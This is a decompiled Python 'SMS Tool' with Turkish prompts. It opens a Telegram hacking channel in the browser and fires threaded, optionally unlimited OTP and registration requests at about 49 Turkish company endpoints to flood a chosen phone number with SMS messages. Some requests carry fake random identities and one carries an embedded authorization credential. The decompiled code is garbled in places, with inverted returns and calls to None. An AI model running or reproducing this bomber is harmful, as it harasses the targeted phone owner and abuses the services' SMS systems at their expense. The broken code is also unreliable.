#Dec bY xF: @DevEviI  oN: @J6_10 🌪️ . 



foo = False
if foo:
    pass
import os
import sys
import subprocess
import webbrowser
webbrowser.open('https://t.me/s4nshacked')

try:
    
    try:
        import requests
        import urllib3
        import uuid
    except:
        pass
    print('Gerekli modüller indiriliyor...')
    subprocess.check_call([
        sys.executable,
        '-m',
        'pip',
        'install',
        'requests==2.28.2',
        'urllib3==1.26.13',
        'uuid==1.30'])
    import concurrent.futures as concurrent
    import json
    import os
    import random
    import requests
    import string
    import time
    import urllib
    import urllib3
    import uuid
    import concurrent.futures as concurrent
    import json
    import os
    import random
    import requests
    import string
    import time
    import urllib
    import urllib3
    import uuid
    
    def a101(number):
        
        try:
            url = 'https://www.a101.com.tr/users/otp-login/'
            payload = {
                'phone': f'''0{number}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            if r.status_code == 200:
                pass
        except:
            return (True, 'A101')
            return (False, 'A101')
        return (False, 'A101')
        


    
    def bim(number):
        
        try:
            url = 'https://bim.veesk.net/service/v1.0/account/login'
            payload = {
                'phone': f'''90{number}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            if r.status_code == 200:
                pass
        except:
            return (True, 'BIM')
            return (False, 'BIM')
        return (False, 'BIM')
        


    
    def defacto(number):
        
        try:
            url = 'https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms'
            payload = {
                'mobilePhone': f'''0{number}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            r1 = json.loads(r.text)['Data']
            if r1 == 'IsSMSSend':
                pass
        except:
            return (True, 'Defacto')
            return (False, 'Defacto')
        return (False, 'Defacto')
        


    
    def istegelsin(number):
        
        try:
            url = 'https://prod.fasapi.net/'
            payload = {
                'query': '\n        mutation SendOtp2($phoneNumber: String!) {\n          sendOtp2(phoneNumber: $phoneNumber) {\n            alreadySent\n            remainingTime\n          }\n        }',
                'variables': {
                    'phoneNumber': f'''90{number}''' } }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            if r.status_code == 200:
                pass
        except:
            return (True, 'İsteGelsin')
            return (False, 'İsteGelsin')
        return (False, 'İsteGelsin')
        


    
    def ikinciyeni(number):
        
        try:
            url = 'https://apigw.ikinciyeni.com/RegisterRequest'
            payload = {
                'accountType': 1,
                'email': f'''{''.join(random.choices(string.ascii_lowercase + string.digits, 12, **('k',)))}@gmail.com''',
                'isAddPermission': False,
                'name': f'''{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, 8, **('k',)))}''',
                'lastName': f'''{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, 8, **('k',)))}''',
                'phone': f'''{number}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            r1 = json.loads(r.text)['isSucceed']
            if r1:
                pass
        except:
            return (True, 'İkinci Yeni')
            return (False, 'İkinci Yeni')
        return (False, 'İkinci Yeni')
        


    
    def migros(number):
        
        try:
            url = 'https://www.migros.com.tr/rest/users/login/otp'
            payload = {
                'phoneNumber': f'''{number}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            r1 = json.loads(r.text)['successful']
            if r1:
                pass
        except:
            return (True, 'Migros')
            return (False, 'Migros')
        return (False, 'Migros')
        


    
    def ceptesok(number):
        
        try:
            url = 'https://api.ceptesok.com/api/users/sendsms'
            payload = {
                'mobile_number': f'''{number}''',
                'token_type': 'register_token' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            if r.status_code == 200:
                pass
        except:
            return (True, 'Cepte Şok')
            return (False, 'Cepte Şok')
        return (False, 'Cepte Şok')
        


    
    def tiklagelsin(number):
        
        try:
            url = 'https://www.tiklagelsin.com/user/graphql'
            payload = {
                'operationName': 'GENERATE_OTP',
                'variables': {
                    'phone': f'''+90{number}''',
                    'challenge': f'''{uuid.uuid4()}''',
                    'deviceUniqueId': f'''web_{uuid.uuid4()}''' },
                'query': 'mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(\n    phone: $phone\n    challenge: $challenge\n    deviceUniqueId: $deviceUniqueId\n  )\n}\n' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            if r.status_code == 200:
                pass
        except:
            return (True, 'Tıkla Gelsin')
            return (False, 'Tıkla Gelsin')
        return (False, 'Tıkla Gelsin')
        


    
    def bisu(number):
        
        try:
            url = 'https://www.bisu.com.tr/api/v2/app/authentication/phone/register'
            payload = {
                'phoneNumber': f'''{number}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            if r.status_code == 200:
                pass
        except:
            return (True, 'BiSU')
            return (False, 'BiSU')
        return (False, 'BiSU')
        


    
    def file(number):
        
        try:
            url = 'https://api.filemarket.com.tr/v1/otp/send'
            payload = {
                'mobilePhoneNumber': f'''90{number}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            r1 = json.loads(r.text)['data']
            if r1 == '200 OK':
                pass
        except:
            return (True, 'File')
            return (False, 'File')
        return (False, 'File')
        


    
    def ipragraz(number):
        
        try:
            url = 'https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp'
            payload = {
                'otp': '',
                'phoneNumber': f'''{number}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            if r.status_code == 200:
                pass
        except:
            return (True, 'İpragaz')
            return (False, 'İpragaz')
        return (False, 'İpragaz')
        


    
    def pisir(number):
        
        try:
            url = 'https://api.pisir.com/v1/login/'
            payload = {
                'msisdn': f'''90{number}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            r1 = json.loads(r.text)['ok']
            if r1 == '1':
                pass
        except:
            return (True, 'Pişir')
            return (False, 'Pişir')
        return (False, 'Pişir')
        


    
    def coffy(number):
        
        try:
            url = 'https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode'
            payload = {
                'phoneNumber': f'''+90{number}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            r1 = json.loads(r.text)['success']
            if r1:
                pass
        except:
            return (True, 'Coffy')
            return (False, 'Coffy')
        return (False, 'Coffy')
        


    
    def sushico(number):
        
        try:
            url = 'https://api.sushico.com.tr/tr/sendActivation'
            payload = {
                'phone': f'''+90{number}''',
                'location': 1,
                'locale': 'tr' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            r1 = json.loads(r.text)['err']
            if r1 == 0:
                pass
        except:
            return (True, 'SushiCo')
            return (False, 'SushiCo')
        return (False, 'SushiCo')
        


    
    def kalmasin(number):
        
        try:
            url = 'https://api.kalmasin.com.tr/user/login'
            payload = {
                'dil': 'tr',
                'device_id': '',
                'notification_mobile': 'android-notificationid-will-be-added',
                'platform': 'android',
                'version': '2.0.6',
                'login_type': 1,
                'telefon': f'''{number}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            r1 = json.loads(r.text)['success']
            if r1:
                pass
        except:
            return (True, 'Kalmasın')
            return (False, 'Kalmasın')
        return (False, 'Kalmasın')
        


    
    def yotto(number):
        
        try:
            url = 'https://42577.smartomato.ru/account/session.json'
            payload = {
                'phone': f'''+90 ({str(number)[0:3]}) {str(number)[3:6]}-{str(number)[6:10]}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            if r.status_code == 201:
                pass
        except:
            return (True, 'Yotto')
            return (False, 'Yotto')
        return (False, 'Yotto')
        


    
    def qumpara(number):
        
        try:
            url = 'https://tr-api.fisicek.com/v1.4/auth/getOTP'
            payload = {
                'msisdn': f'''{number}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            if r.status_code == 200:
                pass
        except:
            return (True, 'Qumpara')
            return (False, 'Qumpara')
        return (False, 'Qumpara')
        


    
    def aygaz(number):
        
        try:
            url = 'https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode'
            payload = {
                'Gsm': f'''{number}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            if r.status_code == 200:
                pass
        except:
            return (True, 'Aygaz')
            return (False, 'Aygaz')
        return (False, 'Aygaz')
        


    
    def pawapp(number):
        
        try:
            url = 'https://api.pawder.app/api/authentication/sign-up'
            payload = {
                'languageId': '2',
                'mobileInformation': '',
                'data': {
                    'firstName': f'''{''.join(random.choices(string.ascii_lowercase, 10, **('k',)))}''',
                    'lastName': f'''{''.join(random.choices(string.ascii_lowercase, 10, **('k',)))}''',
                    'userAgreement': 'true',
                    'kvkk': 'true',
                    'email': f'''{''.join(random.choices(string.ascii_lowercase, 10, **('k',)))}@gmail.com''',
                    'phoneNo': f'''{number}''',
                    'username': f'''{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, 10, **('k',)))}''' } }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            r1 = json.loads(r.text)['success']
            if r1:
                pass
        except:
            return (True, 'PawAPP')
            return (False, 'PawAPP')
        return (False, 'PawAPP')
        


    
    def mopas(number):
        
        try:
            url = 'https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials'
            r = requests.post(url, 2, **('url', 'timeout'))
            if r.status_code == 200:
                token = json.loads(r.text)['access_token']
                token_type = json.loads(r.text)['token_type']
                url = f'''https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber={number}'''
                headers = {
                    'authorization': f'''{token_type} {token}''' }
                r1 = requests.get(url, headers, 2, **('url', 'headers', 'timeout'))
                if r1.status_code == 200:
                    pass
                return (True, 'Mopaş')
            return (False, 'Mopaş')
        return (False, 'Mopaş')
        return (False, 'Mopaş')
        


    
    def paybol(number):
        
        try:
            url = 'https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms'
            payload = {
                'otp_code': 'null',
                'phone_number': f'''90{number}''',
                'reference_id': 'null' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            if r.status_code == 200:
                pass
        except:
            return (True, 'Paybol')
            return (False, 'Paybol')
        return (False, 'Paybol')
        


    
    def ninewest(number):
        
        try:
            url = 'https://www.ninewest.com.tr/webservice/v1/register.json'
            payload = {
                'alertMeWithEMail': False,
                'alertMeWithSms': False,
                'dataPermission': True,
                'email': 'asdafwqww44wt4t4@gmail.com',
                'genderId': random.randint(0, 3),
                'hash': '5488b0f6de',
                'inviteCode': '',
                'password': f'''{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, 16, **('k',)))}''',
                'phoneNumber': f'''({str(number)[0:3]}) {str(number)[3:6]} {str(number)[6:8]} {str(number)[8:10]}''',
                'registerContract': True,
                'registerMethod': 'mail',
                'version': '3' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            r1 = json.loads(r.text)['success']
            if r1:
                pass
        except:
            return (True, 'Nine West')
            return (False, 'Nine West')
        return (False, 'Nine West')
        


    
    def saka(number):
        
        try:
            url = 'https://mobilcrm2.saka.com.tr/api/customer/login'
            payload = {
                'gsm': f'''0{number}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            r1 = json.loads(r.text)['status']
            if r1 == 1:
                pass
        except:
            return (True, 'Saka')
            return (False, 'Saka')
        return (False, 'Saka')
        


    
    def superpedestrian(number):
        
        try:
            url = 'https://consumer-auth.linkyour.city/consumer_auth/register'
            payload = {
                'phone_number': f'''+90{str(number)[0:3]} {str(number)[3:6]} {str(number)[6:10]}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            r1 = json.loads(r.text)['detail']
            if r1 == 'Ok':
                pass
        except:
            return (True, 'Superpedestrian')
            return (False, 'Superpedestrian')
        return (False, 'Superpedestrian')
        


    
    def hayat(number):
        
        try:
            url = f'''https://www.hayatsu.com.tr/api/signup/otpsend?mobilePhoneNumber={number}'''
            r = requests.post(url, 5, **('url', 'timeout'))
            r1 = json.loads(r.text)['IsSuccessful']
            if r1:
                pass
        except:
            return (True, 'Hayat')
            return (False, 'Hayat')
        return (False, 'Hayat')
        


    
    def tazi(number):
        
        try:
            url = 'https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin'
            payload = {
                'cep_tel': f'''{number}''',
                'cep_tel_ulkekod': '90' }
            headers = {
                'authorization': 'Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD' }
            r = requests.post(url, headers, payload, 5, **('url', 'headers', 'json', 'timeout'))
            if r.status_code == 200:
                pass
        except:
            return (True, 'Tazı')
            return (False, 'Tazı')
        return (False, 'Tazı')
        


    
    def gofody(number):
        
        try:
            url = 'https://backend.gofody.com/api/v1/enduser/register/'
            payload = {
                'country_code': '90',
                'phone': f'''{number}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            r1 = json.loads(r.text)['success']
            if r1:
                pass
        except:
            return (True, 'GoFody')
            return (False, 'GoFody')
        return (False, 'GoFody')
        


    
    def weescooter(number):
        
        try:
            url = 'https://friendly-cerf.185-241-138-85.plesk.page/api/v1/members/gsmlogin'
            payload = {
                'tenant': '62a1e7efe74a84ea61f0d588',
                'gsm': f'''{number}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            if r.status_code == 200:
                pass
        except:
            return (True, 'Wee Scooter')
            return (False, 'Wee Scooter')
        return (False, 'Wee Scooter')
        


    
    def scooby(number):
        
        try:
            url = f'''https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90{number}'''
            r = requests.get(url, 5, **('url', 'timeout'))
            if r.status_code == 200:
                pass
        except:
            return (True, 'Scooby')
            return (False, 'Scooby')
        return (False, 'Scooby')
        


    
    def gez(number):
        
        try:
            url = f'''https://gezteknoloji.arabulucuyuz.net/api/Account/get-phone-number-confirmation-code-for-new-user?phonenumber=90{number}'''
            r = requests.get(url, 5, **('url', 'timeout'))
            r1 = json.loads(r.text)['succeeded']
            if r1:
                pass
        except:
            return (True, 'Gez')
            return (False, 'Gez')
        return (False, 'Gez')
        


    
    def heyscooter(number):
        
        try:
            url = f'''https://heyapi.heymobility.tech/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={number}'''
            headers = {
                'user-agent': 'okhttp/3.12.1' }
            r = requests.post(url, headers, 5, **('url', 'headers', 'timeout'))
            r1 = json.loads(r.text)['IsSuccess']
            if r1:
                pass
        except:
            return (True, 'Hey Scooter')
            return (False, 'Hey Scooter')
        return (False, 'Hey Scooter')
        


    
    def jetle(number):
        
        try:
            url = f'''http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber={number}&firmaID=1048'''
            r = requests.get(url, 5, **('url', 'timeout'))
            if r.status_code == 200:
                pass
        except:
            return (True, 'Jetle')
            return (False, 'Jetle')
        return (False, 'Jetle')
        


    
    def rabbit(number):
        
        try:
            url = 'https://api.rbbt.com.tr/v1/auth/authenticate'
            payload = {
                'mobile_number': f'''+90{number}''',
                'os_name': 'android',
                'os_version': '7.1.2',
                'app_version': ' 1.0.2(12)',
                'push_id': '-' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            r1 = json.loads(r.text)['status']
            if r1:
                pass
        except:
            return (True, 'Rabbit')
            return (False, 'Rabbit')
        return (False, 'Rabbit')
        


    
    def roombadi(number):
        
        try:
            url = 'https://api.roombadi.com/api/v1/auth/otp/authenticate'
            payload = {
                'phone': f'''{number}''',
                'countryId': 2 }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            if r.status_code == 200:
                pass
        except:
            return (True, 'Roombadi')
            return (False, 'Roombadi')
        return (False, 'Roombadi')
        


    
    def hizliecza(number):
        
        try:
            url = 'https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP'
            payload = {
                'phoneNumber': f'''+90{number}''',
                'otpOperationType': 2 }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            r1 = json.loads(r.text)['isSuccess']
            if r1:
                pass
        except:
            return (True, 'Hızlı Ecza')
            return (False, 'Hızlı Ecza')
        return (False, 'Hızlı Ecza')
        


    
    def signalall(number):
        
        try:
            url = 'https://appservices.huzk.com/client/register'
            payload = {
                'name': '',
                'phone': {
                    'number': f'''{number}''',
                    'code': '90',
                    'country_code': 'TR',
                    'name': '' },
                'countryCallingCode': '+90',
                'countryCode': 'TR',
                'approved': True,
                'notifyType': 99,
                'favorites': [],
                'appKey': 'live-exchange' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            r1 = json.loads(r.text)['success']
            if r1:
                pass
        except:
            return (True, 'SignalAll')
            return (False, 'SignalAll')
        return (False, 'SignalAll')
        


    
    def goyakit(number):
        
        try:
            url = f'''https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send?phone={number}&isRegistered=false'''
            r = requests.get(url, 5, **('url', 'timeout'))
            r1 = json.loads(r.text)['data']['success']
            if r1:
                pass
        except:
            return (True, 'Go Yakıt')
            return (False, 'Go Yakıt')
        return (False, 'Go Yakıt')
        


    
    def pinar(number):
        
        try:
            url = 'https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp'
            payload = {
                'MobilePhone': f'''{number}''' }
            headers = {
                'devicetype': 'android' }
            r = requests.post(url, headers, payload, 5, **('url', 'headers', 'json', 'timeout'))
            if r.text:
                pass
        except:
            return (True, 'Pınar')
            return (False, 'Pınar')
        return (False, 'Pınar')
        


    
    def oliz(number):
        
        try:
            url = 'https://api.oliz.com.tr/api/otp/send'
            payload = {
                'mobile_number': f'''{number}''',
                'type': None }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            r1 = json.loads(r.text)['meta']['messages']['success'][0]
            if r1 == 'SUCCESS_SEND_SMS':
                pass
        except:
            return (True, 'Oliz')
            return (False, 'Oliz')
        return (False, 'Oliz')
        


    
    def macrocenter(number):
        
        try:
            url = f'''https://www.macrocenter.com.tr/rest/users/login/otp?reid={int(time.time())}'''
            payload = {
                'phoneNumber': f'''{number}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            r1 = json.loads(r.text)['successful']
            if r1:
                pass
        except:
            return (True, 'Macro Center')
            return (False, 'Macro Center')
        return (False, 'Macro Center')
        


    
    def marti(number):
        
        try:
            url = 'https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin'
            payload = {
                'mobilePhone': f'''{number}''',
                'mobilePhoneCountryCode': '90' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            r1 = json.loads(r.text)['isSuccess']
            if r1:
                pass
        except:
            return (True, 'Martı')
            return (False, 'Martı')
        return (False, 'Martı')
        


    
    def karma(number):
        
        try:
            url = 'https://api.gokarma.app/v1/auth/send-sms'
            payload = {
                'phoneNumber': f'''90{number}''',
                'type': 'REGISTER',
                'deviceId': f'''{''.join(random.choices(string.ascii_lowercase + string.digits, 16, **('k',)))}''',
                'language': 'tr-TR' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            if r.status_code == 201:
                pass
        except:
            return (True, 'Karma')
            return (False, 'Karma')
        return (False, 'Karma')
        


    
    def joker(number):
        
        try:
            url = 'https://www.joker.com.tr:443/kullanici/ajax/check-sms'
            payload = {
                'phone': f'''{number}''' }
            headers = {
                'user-agent': '' }
            r = requests.post(url, headers, payload, 5, **('url', 'headers', 'data', 'timeout'))
            r1 = json.loads(r.text)['success']
            if r1:
                pass
        except:
            return (True, 'Joker')
            return (False, 'Joker')
        return (False, 'Joker')
        


    
    def hop(number):
        
        try:
            url = 'https://api.hoplagit.com:443/v1/auth:reqSMS'
            payload = {
                'phone': f'''+90{number}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            if r.status_code == 201:
                pass
        except:
            return (True, 'Hop')
            return (False, 'Hop')
        return (False, 'Hop')
        


    
    def kimgbister(number):
        
        try:
            url = 'https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp'
            payload = {
                'msisdn': f'''90{number}''' }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            if r.status_code == 200:
                pass
        except:
            return (True, 'Kim GB Ister')
            return (False, 'Kim GB Ister')
        return (False, 'Kim GB Ister')
        


    
    def anadolu(number):
        
        try:
            url = 'https://www.anadolu.com.tr/Iletisim_Formu_sms.php'
            payload = urllib.parse.urlencode({
                'Numara': f'''{str(number)[0:3]}{str(number)[3:6]}{str(number)[6:8]}{str(number)[8:10]}''' })
            headers = {
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8' }
            r = requests.post(url, headers, payload, 5, **('url', 'headers', 'data', 'timeout'))
            if r.status_code == 200:
                pass
        except:
            return (True, 'Anadolu')
            return (False, 'Anadolu')
        return (False, 'Anadolu')
        


    
    def total(number):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        try:
            url = f'''https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={number}'''
            r = requests.post(url, False, 5, **('url', 'verify', 'timeout'))
            r1 = json.loads(r.text)['success']
            if r1:
                pass
        except:
            return (True, 'Total')
            return (False, 'Total')
        return (False, 'Total')
        


    
    def englishhome(number):
        
        try:
            url = 'https://www.englishhome.com:443/enh_app/users/registration/'
            payload = {
                'first_name': f'''{''.join(random.choices(string.ascii_lowercase, 8, **('k',)))}''',
                'last_name': f'''{''.join(random.choices(string.ascii_lowercase, 8, **('k',)))}''',
                'email': f'''{''.join(random.choices(string.ascii_lowercase + string.digits, 16, **('k',)))}@gmail.com''',
                'phone': f'''0{number}''',
                'password': f'''{''.join(random.choices(string.ascii_lowercase + string.digits + string.ascii_uppercase, 8, **('k',)))}''',
                'email_allowed': False,
                'sms_allowed': False,
                'confirm': True,
                'tom_pay_allowed': True }
            r = requests.post(url, payload, 5, **('url', 'json', 'timeout'))
            if r.status_code == 202:
                pass
        except:
            return (True, 'English Home')
            return (False, 'English Home')
        return (False, 'English Home')
        


    
    def petrolofisi(number):
        
        try:
            url = 'https://mobilapi.petrolofisi.com.tr:443/api/auth/register'
            payload = {
                'approvedContractVersion': 'v1',
                'approvedKvkkVersion': 'v1',
                'contractPermission': True,
                'deviceId': '',
                'etkContactPermission': True,
                'kvkkPermission': True,
                'mobilePhone': f'''0{number}''',
                'name': f'''{''.join(random.choices(string.ascii_lowercase, 8, **('k',)))}''',
                'plate': f'''{str(random.randrange(1, 81)).zfill(2)}{''.join(random.choices(string.ascii_uppercase, 3, **('k',)))}{str(random.randrange(1, 999)).zfill(3)}''',
                'positiveCard': '',
                'referenceCode': '',
                'surname': f'''{''.join(random.choices(string.ascii_lowercase, 8, **('k',)))}''' }
            headers = {
                'X-Channel': 'IOS' }
            r = requests.post(url, headers, payload, 5, **('url', 'headers', 'json', 'timeout'))
            if r.status_code == 204:
                pass
        except:
            return (True, 'Petrol Ofisi')
            return (False, 'Petrol Ofisi')
        return (False, 'Petrol Ofisi')
        


    
    def send_service(number, service):
        global all_sends, success_sends, all_sends, failed_sends
        result = service(number, **('number',))
        if result[0]:
            all_sends += 1
            success_sends += 1
            print(f'''[+] {all_sends} {result[1]}''')
        else:
            all_sends += 1
            failed_sends += 1
            print(f'''[-] {all_sends} {result[1]}''')

    
    def send(number, amount, worker_amount):
        global all_sends, success_sends, failed_sends
        start_time = int(time.perf_counter())
        functions = [
            a101,
            anadolu,
            aygaz,
            bim,
            bisu,
            ceptesok,
            coffy,
            defacto,
            englishhome,
            file,
            gez,
            gofody,
            goyakit,
            hayat,
            heyscooter,
            hizliecza,
            hop,
            ikinciyeni,
            ipragraz,
            istegelsin,
            jetle,
            joker,
            kalmasin,
            karma,
            kimgbister,
            macrocenter,
            marti,
            migros,
            mopas,
            ninewest,
            oliz,
            pawapp,
            paybol,
            petrolofisi,
            pinar,
            pisir,
            qumpara,
            rabbit,
            roombadi,
            saka,
            scooby,
            signalall,
            superpedestrian,
            sushico,
            tazi,
            tiklagelsin,
            total,
            weescooter,
            yotto]
        random.shuffle(functions)
        clear()
        print(f'''{number} numarasına SMS gönderimi başlatıldı!\n''')
        if amount == 0:
            with concurrent.futures.ThreadPoolExecutor(worker_amount, **('max_workers',)) as executor:
                i = 0
                executor.submit(send_service, number, functions[i % 49])
                i += 1
                if i == len(functions):
                    i = 0
                None(None, None, None)
            if not None:
                pass
        else:
            with concurrent.futures.ThreadPoolExecutor(worker_amount, **('max_workers',)) as executor:
                for i in range(amount):
                    executor.submit(send_service, number, functions[i % 49])
                None(None, None, None)
            if not None:
                pass
        print('\nGönderim tamamlandı!')
        print(f'''{all_sends} SMS, {int(time.perf_counter()) - start_time} saniye içerisinde gönderildi. {success_sends} başarılı, {failed_sends} başarısız.\n''')
        all_sends = 0
        success_sends = 0
        failed_sends = 0
        restart()

    
    def watermark():
        print('SMS Tool v1.5. İyi kullanımlar :)')

    
    def get_number():
        
        try:
            number = int(input('Telefon numarasını yazın. Şunun gibi: "54xxxxxxxx" (Sadece Türkiye numaralarında çalışır!)\n[?] : '))
            if len(str(number)) == 10 and str(number)[0] == '5':
                pass
        except:
            
            clear()
            print('Numara Yanlış. Lütfen geçerli bir numara girin.')
            
            BaseException
            clear()
            print('Lütfen bir numara yazın.')
            
            
            


    
    def get_amount():
        
        try:
            amount = int(input('Kaç SMS gönderilsin? Sınırsız gönderim için "0" basın.\n[?] : '))
            if amount >= 0:
                pass
        except:
            
            clear()
            print("Girilen sayı 0'dan küçük olamaz.")
            
            BaseException
            clear()
            print('Lütfen bir sayı girin.')
            
            
            


    
    def get_worker_amount():
        
        try:
            worker_amount = int(input('Thread sayısını girin. Tavsiye edilen 5-100 arasıdır.\n[?] : '))
            if worker_amount >= 1:
                pass
        except:
            
            clear()
            print("Girilen sayı 1'den küçük olamaz.")
            
            BaseException
            clear()
            print('Lütfen bir sayı girin.')
            
            
            


    
    def restart():
        question = input('Programdan çıkılsın mı?\n[Y/N] : ').upper().replace(' ', '')
        if question == 'Y':
            quit()
            
        if question == 'N':
            clear()
            start()
        
        clear()
        print('Yanlış tuşa basıldı!')
        

    
    def start():
        clear()
        watermark()
        number = get_number()
        amount = get_amount()
        worker_amount = get_worker_amount()
        send(number, amount, worker_amount, **('number', 'amount', 'worker_amount'))

    all_sends = 0
    success_sends = 0
    failed_sends = 0
    
    def clear():
        return os.system('cls')

    start()
    




#Dec bY xF: @DevEviI  oN: @J6_10 🌪️ . 

